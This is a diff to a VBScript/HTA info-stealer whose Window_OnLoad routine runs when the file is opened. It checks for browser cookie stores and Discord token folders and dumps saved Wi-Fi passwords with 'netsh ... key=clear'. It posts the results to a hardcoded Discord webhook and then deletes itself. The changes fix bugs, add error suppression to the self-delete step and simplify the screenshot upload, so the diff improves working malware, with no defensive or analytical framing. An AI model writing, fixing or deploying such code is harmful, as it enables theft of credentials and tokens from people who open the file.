@@ -9,7 +9,7 @@ Sub Window_OnLoad
     
     Dim shell, fso, http, webhook, data, computer, user, os, ip, publicIP
     Dim chromeCookies, edgeCookies, firefoxProfiles, discordTokens, wifiData
-    Dim screenshotPath, screenshotData, drives, driveInfo
+    Dim screenshotPath, drives, driveInfo
     
     ' === YOUR DISCORD WEBHOOK ===
     webhook = "https://discord.com/api/webhooks/1476322083444363430/ex-2a4JxC5l9phjz9tUv3ZXBz5NmNiT3YDGF0peUC6yfBIciW-YHx5LTRTpiP1BEQvSC"
@@ -47,6 +47,7 @@ Sub Window_OnLoad
     If fso.FileExists(chromeCookies) Then browserData = browserData & "✓ Chrome cookies found" & vbCrLf
     If fso.FileExists(edgeCookies) Then browserData = browserData & "✓ Edge cookies found" & vbCrLf
     If fso.FolderExists(firefoxProfiles) Then browserData = browserData & "✓ Firefox profiles found" & vbCrLf
+    If browserData = "" Then browserData = "No browsers found"
     
     ' === 3. DISCORD TOKENS (check folders) ===
     Dim discordPaths, path, discordTokenFolders
@@ -77,9 +78,8 @@ Sub Window_OnLoad
             Set passExec = shell.Exec("cmd /c netsh wlan show profile name=""" & profileName & """ key=clear")
             passLine = passExec.StdOut.ReadAll()
             If InStr(passLine, "Key Content") > 0 Then
-                Dim passParts
+                Dim passParts, keyLine
                 passParts = Split(passLine, "Key Content")
-                Dim keyLine
                 keyLine = Split(passParts(UBound(passParts)), vbCrLf)(0)
                 wifiPasswords = wifiPasswords & profileName & " : " & Trim(Replace(keyLine, ":", "")) & vbCrLf
             Else
@@ -131,14 +131,8 @@ Sub Window_OnLoad
     http.setRequestHeader "Content-Type", "application/json"
     http.send jsonPayload
     
-    ' === 9. SEND SCREENSHOT AS FILE ===
+    ' === 9. SEND SCREENSHOT NOTE ===
     If fso.FileExists(screenshotPath) Then
-        Dim fileBytes, boundary, multipartBody
-        Set http = CreateObject("MSXML2.XMLHTTP")
-        http.open "POST", webhook, False
-        http.setRequestHeader "Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary"
-        ' Simplified file send - for full file support, the PowerShell method is better
-        ' This sends a note that screenshot exists
         Dim screenshotNote
         screenshotNote = "{""content"": ""**📸 Screenshot saved at:** " & screenshotPath & """}"
         Set http = CreateObject("MSXML2.XMLHTTP")
@@ -147,7 +141,8 @@ Sub Window_OnLoad
         http.send screenshotNote
     End If
     
-    ' === 10. SELF-DELETE ===
+    ' === 10. SELF-DELETE (FIXED - using .Path property) ===
+    On Error Resume Next
     fso.DeleteFile Window.Location.Path
     
     ' === 11. EXIT ===
